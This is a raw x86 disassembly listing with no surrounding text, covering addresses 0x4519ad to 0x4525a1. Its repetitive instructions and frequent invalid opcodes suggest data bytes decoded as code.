  4519ad:	add    BYTE PTR [ebx+eax*1+0x290d0000],ah
  4519b4:	cld    
  4519b5:	dec    DWORD PTR ds:0xdfffc29
  4519bb:	sub    esp,edi
  4519bd:	inc    DWORD PTR [eax]
	...
  4519db:	add    BYTE PTR ds:0xdfffc29,cl
  4519e1:	sub    esp,edi
  4519e3:	dec    DWORD PTR ds:0xdfffc29
  4519e9:	sub    esp,edi
  4519eb:	dec    DWORD PTR ds:0xdfffc29
  4519f1:	sub    esp,edi
  4519f3:	dec    DWORD PTR ds:0xdfffc29
  4519f9:	sub    esp,edi
  4519fb:	dec    DWORD PTR ds:0xdfffc29
  451a01:	sub    esp,edi
  451a03:	dec    DWORD PTR ds:0xdfffc29
  451a09:	sub    esp,edi
  451a0b:	dec    DWORD PTR ds:0xdfffc29
  451a11:	sub    esp,edi
  451a13:	dec    DWORD PTR ds:0xdfffc29
  451a19:	sub    esp,edi
  451a1b:	dec    DWORD PTR ds:0xdfffc29
  451a21:	sub    esp,edi
  451a23:	dec    DWORD PTR ds:0xdfffc29
  451a29:	sub    esp,edi
  451a2b:	dec    DWORD PTR ds:0xdfffc29
  451a31:	sub    esp,edi
  451a33:	dec    DWORD PTR ds:0xdfffc29
  451a39:	sub    esp,edi
  451a3b:	dec    DWORD PTR ds:0xfffc29
	...
  451a5d:	add    BYTE PTR ds:0xdfffc29,cl
  451a63:	sub    esp,edi
  451a65:	dec    DWORD PTR ds:0xd03e700
  451a6b:	add    bh,ah
  451a6d:	add    ecx,DWORD PTR ds:0xd03e700
  451a73:	add    bh,ah
  451a75:	add    ecx,DWORD PTR ds:0xd03e700
  451a7b:	add    bh,ah
  451a7d:	add    ecx,DWORD PTR ds:0xd03e700
  451a83:	add    bh,ah
  451a85:	add    ecx,DWORD PTR ds:0xd03e700
  451a8b:	add    bh,ah
  451a8d:	add    ecx,DWORD PTR ds:0xd03e700
  451a93:	add    bh,ah
  451a95:	add    ecx,DWORD PTR ds:0xd03e700
  451a9b:	add    bh,ah
  451a9d:	add    ecx,DWORD PTR ds:0xd03e700
  451aa3:	add    bh,ah
  451aa5:	add    ecx,DWORD PTR ds:0xd03e700
  451aab:	add    bh,ah
  451aad:	add    ecx,DWORD PTR ds:0xd03e700
  451ab3:	add    bh,ah
  451ab5:	add    ecx,DWORD PTR ds:0xd03e700
  451abb:	add    bh,ah
  451abd:	add    ecx,DWORD PTR ds:0x3e700
	...
  451adf:	add    BYTE PTR ds:0xd03e700,cl
  451ae5:	add    bh,ah
  451ae7:	add    ecx,DWORD PTR ds:0xd03e700
  451aed:	add    bh,ah
  451aef:	add    ecx,DWORD PTR ds:0xd03e700
  451af5:	add    bh,ah
  451af7:	add    ecx,DWORD PTR ds:0xd03e700
  451afd:	add    BYTE PTR [eax],al
  451aff:	jmp    0xe9451b12
  451b04:	push   cs
  451b05:	add    BYTE PTR [eax],al
  451b07:	jmp    0xe9451b1a
  451b0c:	push   cs
  451b0d:	add    BYTE PTR [eax],al
  451b0f:	jmp    0xe9451b22
  451b14:	push   cs
  451b15:	add    BYTE PTR [eax],al
  451b17:	jmp    0xe9451b2a
  451b1c:	push   cs
  451b1d:	add    BYTE PTR [eax],al
  451b1f:	jmp    0xe9451b32
  451b24:	push   cs
  451b25:	add    BYTE PTR [eax],al
  451b27:	jmp    0xe9451b3a
  451b2c:	push   cs
  451b2d:	add    BYTE PTR [eax],al
  451b2f:	jmp    0xe9451b42
  451b34:	push   cs
  451b35:	add    BYTE PTR [eax],al
  451b37:	jmp    0xe9451b4a
  451b3c:	push   cs
  451b3d:	add    BYTE PTR [eax],al
  451b3f:	jmp    0xe9451b52
	...
  451b60:	add    BYTE PTR [eax],al
  451b62:	push   cs
  451b63:	add    BYTE PTR [eax],al
  451b65:	jmp    0xe9451b78
  451b6a:	push   cs
  451b6b:	add    BYTE PTR [eax],al
  451b6d:	jmp    0xe9451b80
  451b72:	push   cs
  451b73:	add    BYTE PTR [eax],al
  451b75:	jmp    0xe9451b88
  451b7a:	push   cs
  451b7b:	add    BYTE PTR [eax],al
  451b7d:	jmp    0xe9451b90
  451b82:	push   cs
  451b83:	add    BYTE PTR [eax],al
  451b85:	jmp    0xe9451b98
  451b8a:	push   cs
  451b8b:	add    BYTE PTR [eax],al
  451b8d:	jmp    0xe9451ba0
  451b92:	push   cs
  451b93:	add    BYTE PTR [eax],al
  451b95:	add    ah,ah
  451b97:	add    BYTE PTR [eax],al
  451b99:	add    BYTE PTR [eax+eax*1+0xb40000],dh
  451ba0:	add    BYTE PTR [eax],al
  451ba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  451ba3:	add    BYTE PTR [eax],al
  451ba5:	add    BYTE PTR [eax+eax*1+0xb40000],ah
  451bac:	add    BYTE PTR [eax],al
  451bae:	mov    ah,0x0
  451bb0:	add    BYTE PTR [eax],al
  451bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  451bb3:	add    BYTE PTR [eax],al
  451bb5:	add    BYTE PTR [eax+eax*1+0x740000],ah
  451bbc:	add    BYTE PTR [eax],al
  451bbe:	je     0x451bc0
  451bc0:	add    BYTE PTR [eax],al
  451bc2:	add    BYTE PTR fs:[eax],al
	...
  451be1:	add    BYTE PTR [eax],al
  451be3:	add    BYTE PTR [eax+eax*1+0x0],ah
  451be7:	add    BYTE PTR [eax+eax*1+0x0],dh
  451beb:	add    BYTE PTR [eax+eax*1+0x0],dh
  451bef:	add    BYTE PTR [eax+eax*1+0x0],ah
  451bf3:	add    BYTE PTR [eax+eax*1+0x0],ah
  451bf7:	add    BYTE PTR [eax+eax*1],dh
  451bfa:	add    BYTE PTR [eax],al
  451bfc:	xor    al,0x0
  451bfe:	add    BYTE PTR [eax],al
  451c00:	and    al,0x0
  451c02:	add    BYTE PTR [eax],al
  451c04:	and    al,0x0
  451c06:	add    BYTE PTR [eax],al
  451c08:	xor    al,0x0
  451c0a:	add    BYTE PTR [eax],al
  451c0c:	xor    al,0x0
  451c0e:	add    BYTE PTR [eax],al
  451c10:	and    al,0x0
  451c12:	add    BYTE PTR [eax],al
  451c14:	and    al,0x0
  451c16:	add    BYTE PTR [eax],al
  451c18:	hlt    
  451c19:	(bad)  
  451c1a:	(bad)  
  451c1b:	push   esp
  451c1d:	(bad)  
  451c1e:	(bad)  
  451c1f:	jmp    esp
  451c21:	(bad)  
  451c22:	(bad)  
  451c23:	jmp    esp
  451c25:	(bad)  
  451c26:	(bad)  
  451c27:	push   esp
  451c29:	(bad)  
  451c2a:	(bad)  
  451c2b:	dec    DWORD PTR ds:0xdfffc29
  451c31:	sub    esp,edi
  451c33:	dec    DWORD PTR ds:0xdfffc29
  451c39:	sub    esp,edi
  451c3b:	dec    DWORD PTR ds:0xdfffc29
  451c41:	sub    esp,edi
  451c43:	dec    DWORD PTR ds:0xfffc29
	...
  451c65:	add    BYTE PTR ds:0xdfffc29,cl
  451c6b:	sub    esp,edi
  451c6d:	dec    DWORD PTR ds:0xdfffc29
  451c73:	sub    esp,edi
  451c75:	dec    DWORD PTR ds:0xdfffc29
  451c7b:	sub    esp,edi
  451c7d:	dec    DWORD PTR ds:0xdfffc29
  451c83:	sub    esp,edi
  451c85:	dec    DWORD PTR ds:0xdfffc29
  451c8b:	sub    esp,edi
  451c8d:	dec    DWORD PTR ds:0xdfffc29
  451c93:	sub    esp,edi
  451c95:	dec    DWORD PTR ds:0xdfffc29
  451c9b:	sub    esp,edi
  451c9d:	dec    DWORD PTR ds:0xdfffc29
  451ca3:	sub    esp,edi
  451ca5:	dec    DWORD PTR ds:0xdfffc29
  451cab:	sub    esp,edi
  451cad:	dec    DWORD PTR ds:0xdfffc29
  451cb3:	sub    esp,edi
  451cb5:	dec    DWORD PTR ds:0xdfffc29
  451cbb:	sub    esp,edi
  451cbd:	dec    DWORD PTR ds:0xdfffc29
  451cc3:	add    bh,ah
  451cc5:	add    ecx,DWORD PTR ds:0x3e700
	...
  451ce7:	add    BYTE PTR ds:0xd03e700,cl
  451ced:	add    bh,ah
  451cef:	add    ecx,DWORD PTR ds:0xd03e700
  451cf5:	add    bh,ah
  451cf7:	add    ecx,DWORD PTR ds:0xd03e700
  451cfd:	add    bh,ah
  451cff:	add    ecx,DWORD PTR ds:0xd03e700
  451d05:	add    bh,ah
  451d07:	add    ecx,DWORD PTR ds:0xd03e700
  451d0d:	add    bh,ah
  451d0f:	add    ecx,DWORD PTR ds:0xd03e700
  451d15:	add    bh,ah
  451d17:	add    ecx,DWORD PTR ds:0xd03e700
  451d1d:	add    bh,ah
  451d1f:	add    ecx,DWORD PTR ds:0xd03e700
  451d25:	add    bh,ah
  451d27:	add    ecx,DWORD PTR ds:0xd03e700
  451d2d:	add    bh,ah
  451d2f:	add    ecx,DWORD PTR ds:0xd03e700
  451d35:	add    bh,ah
  451d37:	add    ecx,DWORD PTR ds:0xd03e700
  451d3d:	add    bh,ah
  451d3f:	add    ecx,DWORD PTR ds:0xd03e700
  451d45:	add    bh,ah
  451d47:	add    ecx,DWORD PTR ds:0x3e700
	...
  451d69:	add    BYTE PTR ds:0xd03e700,cl
  451d6f:	add    bh,ah
  451d71:	add    ecx,DWORD PTR ds:0xd03e700
  451d77:	add    BYTE PTR [eax],al
  451d79:	jmp    0xe9451d8c
  451d7e:	push   cs
  451d7f:	add    BYTE PTR [eax],al
  451d81:	jmp    0xe9451d94
  451d86:	push   cs
  451d87:	add    BYTE PTR [eax],al
  451d89:	jmp    0xe9451d9c
  451d8e:	push   cs
  451d8f:	add    BYTE PTR [eax],al
  451d91:	jmp    0xe9451da4
  451d96:	push   cs
  451d97:	add    BYTE PTR [eax],al
  451d99:	jmp    0xe9451dac
  451d9e:	push   cs
  451d9f:	add    BYTE PTR [eax],al
  451da1:	jmp    0xe9451db4
  451da6:	push   cs
  451da7:	add    BYTE PTR [eax],al
  451da9:	jmp    0xe9451dbc
  451dae:	push   cs
  451daf:	add    BYTE PTR [eax],al
  451db1:	jmp    0xe9451dc4
  451db6:	push   cs
  451db7:	add    BYTE PTR [eax],al
  451db9:	jmp    0xe9451dcc
  451dbe:	push   cs
  451dbf:	add    BYTE PTR [eax],al
  451dc1:	jmp    0xe9451dd4
  451dc6:	push   cs
  451dc7:	add    BYTE PTR [eax],al
  451dc9:	jmp    0xe9451ddc
	...
  451dea:	add    BYTE PTR [eax],al
  451dec:	push   cs
  451ded:	add    BYTE PTR [eax],al
  451def:	jmp    0xe9451e02
  451df4:	push   cs
  451df5:	add    BYTE PTR [eax],al
  451df7:	jmp    0xe9451e0a
  451dfc:	push   cs
  451dfd:	add    BYTE PTR [eax],al
  451dff:	jmp    0xe9451e12
  451e04:	push   cs
  451e05:	add    BYTE PTR [eax],al
  451e07:	jmp    0xe9451e1a
  451e0c:	push   cs
  451e0d:	add    BYTE PTR [eax],al
  451e0f:	add    ah,dh
  451e11:	cld    
  451e12:	(bad)  
  451e13:	push   esp
  451e15:	cld    
  451e16:	(bad)  
  451e17:	jmp    esp
  451e19:	cld    
  451e1a:	(bad)  
  451e1b:	jmp    esp
  451e1d:	cld    
  451e1e:	(bad)  
  451e1f:	push   esp
  451e21:	cld    
  451e22:	(bad)  
  451e23:	push   esp
  451e25:	cld    
  451e26:	(bad)  
  451e27:	jmp    esp
  451e29:	cld    
  451e2a:	(bad)  
  451e2b:	jmp    esp
  451e2d:	cld    
  451e2e:	(bad)  
  451e2f:	push   DWORD PTR [esp+edi*8-0x34b0001]
  451e36:	(bad)  
  451e37:	jmp    DWORD PTR [esp+edi*8-0x35b0001]
  451e3e:	(bad)  
  451e3f:	push   DWORD PTR [esp+edi*8-0x34b0001]
  451e46:	(bad)  
  451e47:	jmp    DWORD PTR [esp+edi*8-0x35b0001]
  451e4e:	(bad)  
  451e4f:	inc    DWORD PTR [eax]
	...
  451e6d:	add    BYTE PTR [esp+edi*8-0x1],dh
  451e71:	push   DWORD PTR [esp+edi*8-0x1]
  451e75:	jmp    DWORD PTR [esp+edi*8-0x1]
  451e79:	jmp    DWORD PTR [esp+edi*8-0x1]
  451e7d:	push   DWORD PTR [esp+edi*8-0x1]
  451e81:	push   DWORD PTR [esp+edi*8-0x1]
  451e85:	jmp    DWORD PTR [esp+edi*8-0x1]
  451e89:	jmp    DWORD PTR [esp+edi*8-0x1]
  451e8d:	push   DWORD PTR [esp+edi*8]
  451e90:	(bad)  
  451e91:	push   DWORD PTR [esp+edi*8]
  451e94:	(bad)  
  451e95:	jmp    DWORD PTR [esp+edi*8]
  451e98:	(bad)  
  451e99:	jmp    DWORD PTR [esp+edi*8]
  451e9c:	(bad)  
  451e9d:	push   DWORD PTR [esp+edi*8]
  451ea0:	(bad)  
  451ea1:	push   DWORD PTR [esp+edi*8]
  451ea4:	(bad)  
  451ea5:	dec    DWORD PTR ds:0xdfffc27
  451eab:	daa    
  451eac:	cld    
  451ead:	dec    DWORD PTR ds:0xdfffc29
  451eb3:	sub    esp,edi
  451eb5:	dec    DWORD PTR ds:0xdfffc29
  451ebb:	sub    esp,edi
  451ebd:	dec    DWORD PTR ds:0xdfffc29
  451ec3:	sub    esp,edi
  451ec5:	dec    DWORD PTR ds:0xdfffc29
  451ecb:	sub    esp,edi
  451ecd:	dec    DWORD PTR ds:0xfffc29
	...
  451eef:	add    BYTE PTR ds:0xdfffc29,cl
  451ef5:	sub    esp,edi
  451ef7:	dec    DWORD PTR ds:0xdfffc29
  451efd:	sub    esp,edi
  451eff:	dec    DWORD PTR ds:0xdfffc29
  451f05:	sub    esp,edi
  451f07:	dec    DWORD PTR ds:0xdfffc29
  451f0d:	sub    esp,edi
  451f0f:	dec    DWORD PTR ds:0xdfffc29
  451f15:	sub    esp,edi
  451f17:	dec    DWORD PTR ds:0xdfffc29
  451f1d:	sub    esp,edi
  451f1f:	dec    DWORD PTR ds:0xdfffc29
  451f25:	sub    esp,edi
  451f27:	dec    DWORD PTR ds:0xdfffc29
  451f2d:	sub    esp,edi
  451f2f:	dec    DWORD PTR ds:0xdfffc29
  451f35:	sub    esp,edi
  451f37:	dec    DWORD PTR ds:0xdfffc29
  451f3d:	add    bh,ah
  451f3f:	add    ecx,DWORD PTR ds:0xd03e700
  451f45:	add    bh,ah
  451f47:	add    ecx,DWORD PTR ds:0xd03e700
  451f4d:	add    bh,ah
  451f4f:	add    ecx,DWORD PTR ds:0x3e700
	...
  451f71:	add    BYTE PTR ds:0xd03e700,cl
  451f77:	add    bh,ah
  451f79:	add    ecx,DWORD PTR ds:0xd03e700
  451f7f:	add    bh,ah
  451f81:	add    ecx,DWORD PTR ds:0xd03e700
  451f87:	add    bh,ah
  451f89:	add    ecx,DWORD PTR ds:0xd03e700
  451f8f:	add    bh,ah
  451f91:	add    ecx,DWORD PTR ds:0xd03e700
  451f97:	add    bh,ah
  451f99:	add    ecx,DWORD PTR ds:0xd03e700
  451f9f:	add    bh,ah
  451fa1:	add    ecx,DWORD PTR ds:0xd03e700
  451fa7:	add    bh,ah
  451fa9:	add    ecx,DWORD PTR ds:0xd03e700
  451faf:	add    bh,ah
  451fb1:	add    ecx,DWORD PTR ds:0xd03e700
  451fb7:	add    bh,ah
  451fb9:	add    ecx,DWORD PTR ds:0xd03e700
  451fbf:	add    bh,ah
  451fc1:	add    ecx,DWORD PTR ds:0xd03e700
  451fc7:	add    bh,ah
  451fc9:	add    ecx,DWORD PTR ds:0xd03e700
  451fcf:	add    bh,ah
  451fd1:	add    ecx,DWORD PTR ds:0xe90000
	...
  451ff3:	add    BYTE PTR [esi],cl
  451ff5:	add    BYTE PTR [eax],al
  451ff7:	jmp    0xe945200a
  451ffc:	push   cs
  451ffd:	add    BYTE PTR [eax],al
  451fff:	jmp    0xe9452012
  452004:	push   cs
  452005:	add    BYTE PTR [eax],al
  452007:	jmp    0xe945201a
  45200c:	push   cs
  45200d:	add    BYTE PTR [eax],al
  45200f:	jmp    0xe9452022
  452014:	push   cs
  452015:	add    BYTE PTR [eax],al
  452017:	jmp    0xe945202a
  45201c:	push   cs
  45201d:	add    BYTE PTR [eax],al
  45201f:	jmp    0xe9452032
  452024:	push   cs
  452025:	add    BYTE PTR [eax],al
  452027:	jmp    0xe945203a
  45202c:	push   cs
  45202d:	add    BYTE PTR [eax],al
  45202f:	jmp    0xe9452042
  452034:	push   cs
  452035:	add    BYTE PTR [eax],al
  452037:	jmp    0xe945204a
  45203c:	push   cs
  45203d:	add    BYTE PTR [eax],al
  45203f:	jmp    0xe9452052
  452044:	push   cs
  452045:	add    BYTE PTR [eax],al
  452047:	jmp    0xe945205a
  45204c:	push   cs
  45204d:	add    BYTE PTR [eax],al
  45204f:	jmp    0xe9452062
  452054:	push   cs
  452055:	add    BYTE PTR [eax],al
  452057:	jmp    0x45205c
	...
  452074:	add    BYTE PTR [eax],al
  452076:	push   cs
  452077:	add    BYTE PTR [eax],al
  452079:	jmp    0xe945208c
  45207e:	push   cs
  45207f:	add    BYTE PTR [eax],al
  452081:	jmp    0xe9452094
  452086:	push   cs
  452087:	add    BYTE PTR [eax],al
  452089:	add    BYTE PTR [ecx+eax*1],dh
  45208c:	add    BYTE PTR [eax],al
  45208e:	and    al,0x1
  452090:	add    BYTE PTR [eax],al
  452092:	and    al,0x1
  452094:	add    BYTE PTR [eax],al
  452096:	xor    al,0x1
  452098:	add    BYTE PTR [eax],al
  45209a:	xor    al,0x1
  45209c:	add    BYTE PTR [eax],al
  45209e:	and    al,0x1
  4520a0:	add    BYTE PTR [eax],al
  4520a2:	and    al,0x1
  4520a4:	add    BYTE PTR [eax],al
  4520a6:	hlt    
  4520a7:	add    BYTE PTR [eax],al
  4520a9:	add    ah,dh
  4520ab:	add    BYTE PTR [eax],al
  4520ad:	add    ah,ah
  4520af:	add    BYTE PTR [eax],al
  4520b1:	add    ah,ah
  4520b3:	add    BYTE PTR [eax],al
  4520b5:	add    ah,dh
  4520b7:	add    BYTE PTR [eax],al
  4520b9:	add    ah,dh
  4520bb:	add    BYTE PTR [eax],al
  4520bd:	add    ah,ah
  4520bf:	add    BYTE PTR [eax],al
  4520c1:	add    ah,ah
  4520c3:	add    BYTE PTR [eax],al
  4520c5:	add    BYTE PTR [eax+eax*1+0xb40000],dh
  4520cc:	add    BYTE PTR [eax],al
  4520ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4520cf:	add    BYTE PTR [eax],al
  4520d1:	add    BYTE PTR [eax+eax*1+0xb40000],ah
	...
  4520f8:	mov    ah,0x0
  4520fa:	add    BYTE PTR [eax],al
  4520fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4520fd:	add    BYTE PTR [eax],al
  4520ff:	add    BYTE PTR [eax+eax*1+0x740000],ah
  452106:	add    BYTE PTR [eax],al
  452108:	je     0x45210a
  45210a:	add    BYTE PTR [eax],al
  45210c:	add    BYTE PTR fs:[eax],al
  45210f:	add    BYTE PTR [eax+eax*1+0x0],ah
  452113:	add    BYTE PTR [eax+eax*1+0x0],dh
  452117:	add    BYTE PTR [eax+eax*1+0x0],dh
  45211b:	add    BYTE PTR [eax+eax*1+0x0],ah
  45211f:	add    BYTE PTR ds:0xdfffc27,cl
  452125:	daa    
  452126:	cld    
  452127:	dec    DWORD PTR ds:0xdfffc27
  45212d:	daa    
  45212e:	cld    
  45212f:	dec    DWORD PTR ds:0xdfffc27
  452135:	daa    
  452136:	cld    
  452137:	dec    DWORD PTR ds:0xdfffc27
  45213d:	daa    
  45213e:	cld    
  45213f:	dec    DWORD PTR ds:0xdfffc27
  452145:	sub    esp,edi
  452147:	dec    DWORD PTR ds:0xdfffc29
  45214d:	sub    esp,edi
  45214f:	dec    DWORD PTR ds:0xdfffc29
  452155:	sub    esp,edi
  452157:	dec    DWORD PTR ds:0xfffc29
	...
  452179:	add    BYTE PTR ds:0xdfffc29,cl
  45217f:	sub    esp,edi
  452181:	dec    DWORD PTR ds:0xdfffc29
  452187:	sub    esp,edi
  452189:	dec    DWORD PTR ds:0xdfffc29
  45218f:	sub    esp,edi
  452191:	dec    DWORD PTR ds:0xdfffc29
  452197:	sub    esp,edi
  452199:	dec    DWORD PTR ds:0xdfffc29
  45219f:	sub    esp,edi
  4521a1:	dec    DWORD PTR ds:0xdfffc29
  4521a7:	sub    esp,edi
  4521a9:	dec    DWORD PTR ds:0xdfffc29
  4521af:	sub    esp,edi
  4521b1:	dec    DWORD PTR ds:0xdfffc29
  4521b7:	add    bh,ah
  4521b9:	add    ecx,DWORD PTR ds:0xd03e700
  4521bf:	add    bh,ah
  4521c1:	add    ecx,DWORD PTR ds:0xd03e700
  4521c7:	add    bh,ah
  4521c9:	add    ecx,DWORD PTR ds:0xd03e700
  4521cf:	add    bh,ah
  4521d1:	add    ecx,DWORD PTR ds:0xd03e700
  4521d7:	add    bh,ah
  4521d9:	add    ecx,DWORD PTR ds:0x3e700
	...
  4521fb:	add    BYTE PTR ds:0xd03e700,cl
  452201:	add    bh,ah
  452203:	add    ecx,DWORD PTR ds:0xd03e700
  452209:	add    bh,ah
  45220b:	add    ecx,DWORD PTR ds:0xd03e700
  452211:	add    bh,ah
  452213:	add    ecx,DWORD PTR ds:0xd03e700
  452219:	add    bh,ah
  45221b:	add    ecx,DWORD PTR ds:0xd03e700
  452221:	add    bh,ah
  452223:	add    ecx,DWORD PTR ds:0xd03e700
  452229:	add    bh,ah
  45222b:	add    ecx,DWORD PTR ds:0xd03e700
  452231:	add    bh,ah
  452233:	add    ecx,DWORD PTR ds:0xd03e700
  452239:	add    bh,ah
  45223b:	add    ecx,DWORD PTR ds:0xd03e700
  452241:	add    bh,ah
  452243:	add    ecx,DWORD PTR ds:0xd03e700
  452249:	add    bh,ah
  45224b:	add    ecx,DWORD PTR ds:0xee90000
  452251:	add    BYTE PTR [eax],al
  452253:	jmp    0xe9452266
  452258:	push   cs
  452259:	add    BYTE PTR [eax],al
  45225b:	jmp    0xe945226e
	...
  45227c:	add    BYTE PTR [eax],al
  45227e:	push   cs
  45227f:	add    BYTE PTR [eax],al
  452281:	jmp    0xe9452294
  452286:	push   cs
  452287:	add    BYTE PTR [eax],al
  452289:	jmp    0xe945229c
  45228e:	push   cs
  45228f:	add    BYTE PTR [eax],al
  452291:	jmp    0xe94522a4
  452296:	push   cs
  452297:	add    BYTE PTR [eax],al
  452299:	jmp    0xe94522ac
  45229e:	push   cs
  45229f:	add    BYTE PTR [eax],al
  4522a1:	jmp    0xe94522b4
  4522a6:	push   cs
  4522a7:	add    BYTE PTR [eax],al
  4522a9:	jmp    0xe94522bc
  4522ae:	push   cs
  4522af:	add    BYTE PTR [eax],al
  4522b1:	jmp    0xe94522c4
  4522b6:	push   cs
  4522b7:	add    BYTE PTR [eax],al
  4522b9:	jmp    0xe94522cc
  4522be:	push   cs
  4522bf:	add    BYTE PTR [eax],al
  4522c1:	jmp    0xe94522d4
  4522c6:	push   cs
  4522c7:	add    BYTE PTR [eax],al
  4522c9:	jmp    0xe94522dc
  4522ce:	push   cs
  4522cf:	add    BYTE PTR [eax],al
  4522d1:	jmp    0xe94522e4
  4522d6:	push   cs
  4522d7:	add    BYTE PTR [eax],al
  4522d9:	jmp    0xe94522ec
  4522de:	push   cs
  4522df:	add    BYTE PTR [eax],al
  4522e1:	jmp    0x4522e6
	...
  4522fe:	add    BYTE PTR [eax],al
  452300:	push   cs
  452301:	add    BYTE PTR [eax],al
  452303:	add    BYTE PTR [ebp+edi*8-0x1],ah
  452307:	jmp    DWORD PTR [ebp+edi*8-0x1]
  45230b:	push   DWORD PTR [ebp+edi*8-0x1]
  45230f:	push   DWORD PTR [ebp+edi*8-0x1]
  452313:	jmp    DWORD PTR [ebp+edi*8-0x1]
  452317:	jmp    DWORD PTR [ebp+edi*8-0x1]
  45231b:	push   DWORD PTR [edi*8-0x2cb0001]
  452322:	(bad)  
  452323:	jmp    DWORD PTR [edi*8-0x2db0001]
  45232a:	(bad)  
  45232b:	push   DWORD PTR [edi*8-0x2cb0001]
  452332:	(bad)  
  452333:	jmp    DWORD PTR [edi*8-0x2db0001]
  45233a:	(bad)  
  45233b:	push   esp
  45233d:	cld    
  45233e:	(bad)  
  45233f:	push   esp
  452341:	cld    
  452342:	(bad)  
  452343:	jmp    esp
  452345:	cld    
  452346:	(bad)  
  452347:	jmp    esp
  452349:	cld    
  45234a:	(bad)  
  45234b:	push   esp
  45234d:	cld    
  45234e:	(bad)  
  45234f:	push   esp
  452351:	cld    
  452352:	(bad)  
  452353:	jmp    esp
  452355:	cld    
  452356:	(bad)  
  452357:	jmp    esp
  452359:	cld    
  45235a:	(bad)  
  45235b:	push   DWORD PTR [esp+edi*8-0x34b0001]
  452362:	(bad)  
  452363:	inc    DWORD PTR [eax]
	...
  452381:	add    BYTE PTR [esp+edi*8-0x35b0001],ah
  452388:	(bad)  
  452389:	push   DWORD PTR [esp+edi*8-0x34b0001]
  452390:	(bad)  
  452391:	jmp    DWORD PTR [esp+edi*8-0x35b0001]
  452398:	(bad)  
  452399:	dec    DWORD PTR ds:0xdfffc27
  45239f:	daa    
  4523a0:	cld    
  4523a1:	dec    DWORD PTR ds:0xdfffc27
  4523a7:	daa    
  4523a8:	cld    
  4523a9:	dec    DWORD PTR ds:0xdfffc27
  4523af:	daa    
  4523b0:	cld    
  4523b1:	dec    DWORD PTR ds:0xdfffc27
  4523b7:	daa    
  4523b8:	cld    
  4523b9:	dec    DWORD PTR ds:0xdfffc27
  4523bf:	daa    
  4523c0:	cld    
  4523c1:	dec    DWORD PTR ds:0xdfffc27
  4523c7:	daa    
  4523c8:	cld    
  4523c9:	dec    DWORD PTR ds:0xdfffc27
  4523cf:	daa    
  4523d0:	cld    
  4523d1:	dec    DWORD PTR ds:0xdfffc27
  4523d7:	daa    
  4523d8:	cld    
  4523d9:	dec    DWORD PTR ds:0xdfffc19
  4523df:	sbb    esp,edi
  4523e1:	dec    DWORD PTR ds:0xfffc19
	...
  452403:	add    BYTE PTR ds:0xdfffc19,cl
  452409:	sbb    esp,edi
  45240b:	dec    DWORD PTR ds:0xdfffc19
  452411:	sbb    esp,edi
  452413:	dec    DWORD PTR ds:0xdfffc19
  452419:	sbb    esp,edi
  45241b:	dec    DWORD PTR ds:0xdfffc19
  452421:	sbb    esp,edi
  452423:	dec    DWORD PTR ds:0xdfffc19
  452429:	sbb    esp,edi
  45242b:	dec    DWORD PTR ds:0xdfffc19
  452431:	add    bh,ah
  452433:	add    ecx,DWORD PTR ds:0xd03e700
  452439:	add    bh,ah
  45243b:	add    ecx,DWORD PTR ds:0xd03e700
  452441:	add    bh,ah
  452443:	add    ecx,DWORD PTR ds:0xd03e700
  452449:	add    bh,ah
  45244b:	add    ecx,DWORD PTR ds:0xd03e700
  452451:	add    bh,ah
  452453:	add    ecx,DWORD PTR ds:0xd03e700
  452459:	add    bh,ah
  45245b:	add    ecx,DWORD PTR ds:0xd03e700
  452461:	add    bh,ah
  452463:	add    ecx,DWORD PTR ds:0x3e700
	...
  452485:	add    BYTE PTR ds:0xd03e700,cl
  45248b:	add    bh,ah
  45248d:	add    ecx,DWORD PTR ds:0xd03e700
  452493:	add    bh,ah
  452495:	add    ecx,DWORD PTR ds:0xd03e700
  45249b:	add    bh,ah
  45249d:	add    ecx,DWORD PTR ds:0xd03e700
  4524a3:	add    bh,ah
  4524a5:	add    ecx,DWORD PTR ds:0xd03e700
  4524ab:	add    bh,ah
  4524ad:	add    ecx,DWORD PTR ds:0xd03e700
  4524b3:	add    bh,ah
  4524b5:	add    ecx,DWORD PTR ds:0xd03e700
  4524bb:	add    bh,ah
  4524bd:	add    ecx,DWORD PTR ds:0xd03e700
  4524c3:	add    bh,ah
  4524c5:	add    ecx,DWORD PTR ds:0xee90000
  4524cb:	add    BYTE PTR [eax],al
  4524cd:	jmp    0xe94524e0
  4524d2:	push   cs
  4524d3:	add    BYTE PTR [eax],al
  4524d5:	jmp    0xe94524e8
  4524da:	push   cs
  4524db:	add    BYTE PTR [eax],al
  4524dd:	jmp    0xe94524f0
  4524e2:	push   cs
  4524e3:	add    BYTE PTR [eax],al
  4524e5:	jmp    0xe94524f8
	...
  452506:	add    BYTE PTR [eax],al
  452508:	push   cs
  452509:	add    BYTE PTR [eax],al
  45250b:	jmp    0xe945251e
  452510:	push   cs
  452511:	add    BYTE PTR [eax],al
  452513:	jmp    0xe9452526
  452518:	push   cs
  452519:	add    BYTE PTR [eax],al
  45251b:	jmp    0xe945252e
  452520:	push   cs
  452521:	add    BYTE PTR [eax],al
  452523:	jmp    0xe9452536
  452528:	push   cs
  452529:	add    BYTE PTR [eax],al
  45252b:	jmp    0xe945253e
  452530:	push   cs
  452531:	add    BYTE PTR [eax],al
  452533:	jmp    0xe9452546
  452538:	push   cs
  452539:	add    BYTE PTR [eax],al
  45253b:	jmp    0xe945254e
  452540:	push   cs
  452541:	add    BYTE PTR [eax],al
  452543:	jmp    0xe9452556
  452548:	push   cs
  452549:	add    BYTE PTR [eax],al
  45254b:	jmp    0xe945255e
  452550:	push   cs
  452551:	add    BYTE PTR [eax],al
  452553:	jmp    0xe9452566
  452558:	push   cs
  452559:	add    BYTE PTR [eax],al
  45255b:	jmp    0x45256e
  452560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  452561:	add    DWORD PTR [eax],eax
  452563:	add    BYTE PTR [ecx+eax*1+0x1b40000],dh
	...
  45258a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  45258b:	add    DWORD PTR [eax],eax
  45258d:	add    BYTE PTR [ecx+eax*1+0x1740000],ah
  452594:	add    BYTE PTR [eax],al
  452596:	je     0x452599
  452598:	add    BYTE PTR [eax],al
  45259a:	add    DWORD PTR fs:[eax],eax
  45259d:	add    BYTE PTR [ecx+eax*1+0x0],ah
  4525a1:	add    BYTE PTR [ecx+eax*1+0x0],dh
